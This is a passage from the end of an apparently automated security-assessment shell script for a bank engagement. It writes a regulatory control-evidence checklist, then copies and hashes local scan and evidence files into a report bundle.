  { printf '%s\n' '# Control evidence checklist' '' '- [ ] ISO 27001 A.5-A.8: policy, access, crypto, logging evidence collected' '- [ ] PCI DSS 4.0: requirement 1,2,6,8,10,11 evidence collected' '- [ ] RBI cyber-security framework: baseline and exception list' '- [ ] IRDA information-security guidelines: controls tested and gaps' '- [ ] UIDAI eKYC: Aadhaar data handling and encryption evidence' '- [ ] SEBI CSCRF: controls mapped and observed' '- [ ] ITGC: change, access and operations evidence per application' '- [ ] BCP/DR: RTO/RPO evidence and last test result' '- [ ] SOC review: log sources, use cases, alert handling times' > ~/BugX/thuringerbank/05_reports/control_checklist.md; cat ~/BugX/thuringerbank/05_reports/control_checklist.md ; } 2>&1 | tee -a "$LOG"
fi

# 418. Collect the evidence bundle for the framework you are reporting against  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '418. Collect the evidence bundle for the framework you are reporting against'
else
  { mkdir -p ~/BugX/thuringerbank/05_reports/evidence_bundle && cp ~/BugX/thuringerbank/02_scanning/*.txt ~/BugX/thuringerbank/04_evidence/*.txt ~/BugX/thuringerbank/05_reports/*.md ~/BugX/thuringerbank/05_reports/evidence_bundle/ 2>/dev/null; sha256sum ~/BugX/thuringerbank/05_reports/evidence_bundle/* > ~/BugX/thuringerbank/05_reports/evidence_bundle.sha256; wc -l ~/BugX/thuringerbank/05_reports/evidence_bundle.sha256 ; } 2>&1 | tee -a "$LOG"
fi

note "run complete — evidence hashes: $WS/05_reports/evidence_manifest.txt"
